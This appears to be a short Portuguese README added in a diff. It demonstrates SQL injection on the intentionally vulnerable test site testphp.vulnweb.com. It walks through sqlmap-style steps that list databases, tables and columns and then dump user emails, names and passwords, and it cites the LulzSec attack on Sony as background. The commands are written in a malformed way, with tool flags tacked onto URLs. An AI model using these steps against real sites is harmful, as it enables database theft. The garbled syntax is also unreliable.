@@ -1,0 +1,27 @@
+# Ataques Comuns Em Web Aplicações
+</p> Quando falamos em ataques em web sites pensamos que é um ataque dificil de ser executado,  mais é tao simples quanto parece citaremos alguns ataques mais comuns feitos por Grupo , ou indivíduos em sistemas on-line ...</p>
+<br>
+# Lulzsec um grupo que atuou em meados de 2011 atingindo alguns sistemas grandes em um dos seus ataques conseguiram extrair o banco de dados da sony networking,  este ataque foi um SQl Injection Ou Sqli vamos fazer uma demonstração de como fuinciona
+
+
+<p align="center">
+	
+<img align="center" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsZUfCDLPcxz_s39-Z378QMmhCb2dMrHHG6w&usqp=CAU"/>
+
+</p>
+vamos usar um site de teste lembrando-se a ferramenta usada aqui sera o Scanner Sql Map Otima ferramenta pra test de vulnerabilidade sqli </p>aqui é listado o nome da data base <br>
+http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 --dbs
+<p align="center">
+	
+<img align="center" src="https://uploaddeimagens.com.br/images/004/330/558/thumb/PhotoRoom-20230205_164406.png?1675626846"/></p>aqui vemos que foi extraído a data base agora vamos lista as tabelas<br>http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 -D acuart --tables
+<p align="center">
+	
+<img align="center" src="https://uploaddeimagens.com.br/images/004/330/559/thumb/Screenshot_20230205-163448_Termux.jpg?1675626983"/></p>Feito isso agora vamos listar a coluna<br>http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 -D acuart -T users --columns
+<p align="center">
+	
+<img align="center" src="https://uploaddeimagens.com.br/images/004/330/566/thumb/Screenshot_20230205-170138_Termux.jpg?1675627342"/></p>Feito isso vamos listar o e-mail senha e usuário da database e assim concluir com a invasão <br>
+http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1 -D acuart -T users -C email,name,pass --dump
+<p align="center">
+	
+<img align="center" src="https://uploaddeimagens.com.br/images/004/330/576/original/Screenshot_20230205-170621_Termux.jpg?1675627625"/></p>
+Oque podemos levar em conta com este ataque por ser antigo até hoje em 2023 vemos que a syntaxe do Sql continua vulnerável em muitos sites , isso é culpa de quem ? Eu não coloco culpa em ninguém pois todo sistema é falho em uma simples exploração como exemplo  atinge governos universidades empresas entre outras atingindo o mundo enteiro,
